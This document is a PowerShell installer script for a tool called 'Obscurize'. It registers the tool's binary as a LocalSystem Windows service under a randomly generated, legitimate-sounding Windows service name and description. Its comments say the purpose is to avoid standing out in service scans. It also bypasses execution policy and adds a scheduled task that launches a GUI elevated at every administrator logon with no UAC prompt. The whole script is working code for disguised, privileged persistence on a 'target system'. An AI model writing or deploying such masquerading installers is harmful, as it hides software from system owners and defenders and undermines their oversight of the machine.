# ============================================================
#  ObscurizeInitializer.ps1
#
#  One-shot setup script for Obscurize on a target system.
#  Run this once after copying the built binaries to the
#  install directory.  It will:
#
#    1. Verify ObscurizeService.exe and ObscurizeGUI.exe exist
#       at the install path.
#    2. Register (or update) the service with a randomized name
#       and display name to reduce visibility in service scans.
#       The chosen identity is written to service.cfg in the
#       install directory and reused on upgrade runs.
#       Default start type: demand (manual).  After validating
#       stability on the target system, promote with:
#         sc config <ServiceName> start= delayed-auto
#    3. Start the service immediately.
#    4. Create a Task Scheduler task so ObscurizeGUI launches
#       at logon for any member of BUILTIN\Administrators -
#       elevated, with no UAC prompt.
#    5. Launch ObscurizeGUI now so the operator can verify
#       the initial state.
#
#  Usage (from an elevated PowerShell session):
#
#    .\ObscurizeInitializer.ps1
#
#  Optional overrides:
#
#    .\ObscurizeInitializer.ps1 -InstallPath "D:\Tools\Obscurize"
#    .\ObscurizeInitializer.ps1 -ServiceName "MySvc" -DisplayName "My Service"
#
# ============================================================

param(
    [string]$InstallPath = "C:\ProgramData\Obscurize",
    [string]$ServiceName = "",
    [string]$DisplayName = ""
)

# --- Elevation guard -------------------------------------------------
$currentIdentity  = [Security.Principal.WindowsIdentity]::GetCurrent()
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
{
    Write-Host "Relaunching as Administrator..." -ForegroundColor Yellow
    $relaunchArgs = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -InstallPath `"$InstallPath`""
    if ($ServiceName) { $relaunchArgs += " -ServiceName `"$ServiceName`"" }
    if ($DisplayName) { $relaunchArgs += " -DisplayName `"$DisplayName`"" }
    Start-Process powershell.exe -ArgumentList $relaunchArgs -Verb RunAs
    exit
}

# --- Service identity generator --------------------------------------
# Produces a randomized but plausible-sounding Windows service name
# so the service does not stand out in a service scan.
function New-ServiceIdentity
{
    $prefixes  = @('Win','Sys','Host','Plat','Core','Wdi','Dm','Net','Svc')
    $midparts  = @('Mgmt','Diag','Maint','Push','Rt','Host','Ctrl','Cfg','Mon')
    $suffixes  = @('Svc','Host','Agent','Mgr','Worker')

    $wfirst = @('Windows','System','Background','Device','Host','Platform')
    $wmid   = @('Management','Diagnostic','Maintenance','Infrastructure',
                'Platform','Network','Configuration','Update')
    $wlast  = @('Service','Manager','Broker','Agent','Infrastructure','Host')

    $descriptions = @(
        'Manages platform services and host processes for this computer.',
        'Provides infrastructure support for system management components.',
        'Coordinates background maintenance tasks for system health monitoring.',
        'Supports platform diagnostics and system maintenance operations.',
        'Manages host process infrastructure for installed platform services.',
        'Handles background service coordination for system management tasks.'
    )

    return @{
        Name        = ($prefixes | Get-Random) + ($midparts | Get-Random) + ($suffixes | Get-Random)
        Display     = ($wfirst | Get-Random) + ' ' + ($wmid | Get-Random) + ' ' + ($wlast | Get-Random)
        Description = ($descriptions | Get-Random)
    }
}

# --- Config ----------------------------------------------------------
$ServiceCfgPath     = Join-Path $InstallPath "service.cfg"
$ServiceExe         = Join-Path $InstallPath "ObscurizeService.exe"
$GuiExe             = Join-Path $InstallPath "ObscurizeGUI.exe"
$TaskFolder         = "\Obscurize\"
$TaskName           = "ObscurizeGUI"
$ServiceDescription = ""
$IsUpgrade          = $false

# Resolve service identity: explicit params > stored cfg > generate new
if ($ServiceName -and $DisplayName)
{
    $ServiceDescription = "Manages platform services and host processes for this computer."
}
elseif (Test-Path $ServiceCfgPath)
{
    $cfg                = Get-Content $ServiceCfgPath -Encoding UTF8 | ConvertFrom-StringData
    $ServiceName        = $cfg.ServiceName
    $DisplayName        = $cfg.DisplayName
    $ServiceDescription = $cfg.Description
    $IsUpgrade          = $true
}
else
{
    $id                 = New-ServiceIdentity
    if (-not $ServiceName) { $ServiceName = $id.Name    }
    if (-not $DisplayName) { $DisplayName = $id.Display }
    $ServiceDescription = $id.Description
}

Write-Host ""
Write-Host "  =======================================" -ForegroundColor Cyan
Write-Host "       OBSCURIZE INITIALIZER"             -ForegroundColor Cyan
Write-Host "  =======================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Install path : $InstallPath" -ForegroundColor Gray
if ($IsUpgrade) {
    Write-Host "  Mode         : upgrade (reusing existing service identity)" -ForegroundColor DarkCyan
} else {
    Write-Host "  Mode         : fresh install" -ForegroundColor DarkCyan
}
Write-Host ""

# --- Step 1: Verify binaries -----------------------------------------
Write-Host "  [1/4] Verifying binaries..." -ForegroundColor White

$missing = $false
foreach ($file in @($ServiceExe, $GuiExe))
{
    if (Test-Path $file)
    {
        Write-Host "        FOUND   $file" -ForegroundColor Green
    }
    else
    {
        Write-Host "        MISSING $file" -ForegroundColor Red
        $missing = $true
    }
}

if ($missing)
{
    Write-Host ""
    Write-Host "  ERROR: One or more binaries are missing." -ForegroundColor Red
    Write-Host "         Build the solution first, then copy ObscurizeService.exe" -ForegroundColor Red
    Write-Host "         and ObscurizeGUI.exe to: $InstallPath" -ForegroundColor Red
    Write-Host ""
    exit 1
}

# --- Step 2: Register / update the Windows Service ------------------
Write-Host ""
Write-Host "  [2/4] Registering Windows Service..." -ForegroundColor White

$existing = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue

if ($existing)
{
    Write-Host "        Service '$ServiceName' already registered - updating binary path." -ForegroundColor Yellow

    if ($existing.Status -eq "Running")
    {
        Write-Host "        Stopping existing service..." -ForegroundColor Yellow
        Stop-Service -Name $ServiceName -Force
        $existing.WaitForStatus("Stopped", (New-TimeSpan -Seconds 15))
    }

    & sc.exe config $ServiceName binPath= "`"$ServiceExe`"" | Out-Null
    Write-Host "        Binary path updated." -ForegroundColor Green
}
else
{
    & sc.exe create $ServiceName binPath= "`"$ServiceExe`"" start= demand obj= LocalSystem DisplayName= "$DisplayName" | Out-Null

    if ($LASTEXITCODE -ne 0)
    {
        Write-Host "        ERROR: sc.exe create failed (exit $LASTEXITCODE)." -ForegroundColor Red
        exit 1
    }

    & sc.exe description $ServiceName "$ServiceDescription" | Out-Null
    Write-Host "        Service created." -ForegroundColor Green
}

# Persist chosen identity so upgrade runs reuse the same service name
if (-not $IsUpgrade)
{
    "ServiceName=$ServiceName`nDisplayName=$DisplayName`nDescription=$ServiceDescription" |
        Out-File $ServiceCfgPath -Encoding UTF8
    Write-Host "        Identity saved to service.cfg" -ForegroundColor DarkGray
}

# --- Step 3: Start the service ---------------------------------------
Write-Host ""
Write-Host "  [3/4] Starting service..." -ForegroundColor White

Start-Service -Name $ServiceName -ErrorAction SilentlyContinue

$deadline = (Get-Date).AddSeconds(10)
do
{
    Start-Sleep -Milliseconds 250
    $svc = Get-Service -Name $ServiceName
}
while ($svc.Status -ne "Running" -and (Get-Date) -lt $deadline)

if ($svc.Status -eq "Running")
{
    Write-Host "        Service is running." -ForegroundColor Green
}
else
{
    Write-Host "        WARNING: Service did not reach Running state within 10 s." -ForegroundColor Yellow
    Write-Host "                 Current status: $($svc.Status)" -ForegroundColor Yellow
}

# --- Step 4: Register the GUI auto-start task ------------------------
Write-Host ""
Write-Host "  [4/4] Registering GUI auto-start task..." -ForegroundColor White

$taskAction    = New-ScheduledTaskAction -Execute $GuiExe
$taskTrigger   = New-ScheduledTaskTrigger -AtLogOn
$taskPrincipal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$taskSettings  = New-ScheduledTaskSettingsSet `
    -ExecutionTimeLimit         (New-TimeSpan -Seconds 0) `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -MultipleInstances          IgnoreNew

Register-ScheduledTask `
    -TaskName  $TaskName `
    -TaskPath  $TaskFolder `
    -Action    $taskAction `
    -Trigger   $taskTrigger `
    -Principal $taskPrincipal `
    -Settings  $taskSettings `
    -Force | Out-Null

Write-Host "        Task '\Obscurize\ObscurizeGUI' registered." -ForegroundColor Green

# --- Done ------------------------------------------------------------
Write-Host ""
Write-Host "  =======================================" -ForegroundColor Cyan
Write-Host "       SETUP COMPLETE"                    -ForegroundColor Cyan
Write-Host "  =======================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Service name    : $ServiceName"    -ForegroundColor Yellow
Write-Host "  Display name    : $DisplayName"    -ForegroundColor Yellow
Write-Host "  Identity stored : $ServiceCfgPath" -ForegroundColor Gray
Write-Host ""
Write-Host "  Start type : demand (manual) - start manually each boot until validated" -ForegroundColor Gray
Write-Host "  To promote after validation:" -ForegroundColor Gray
Write-Host "    sc config $ServiceName start= delayed-auto" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  ObscurizeGUI : launches at logon for all Administrators" -ForegroundColor Gray
Write-Host ""
Write-Host "  Launching ObscurizeGUI now..." -ForegroundColor White
Write-Host ""

Start-Process -FilePath $GuiExe
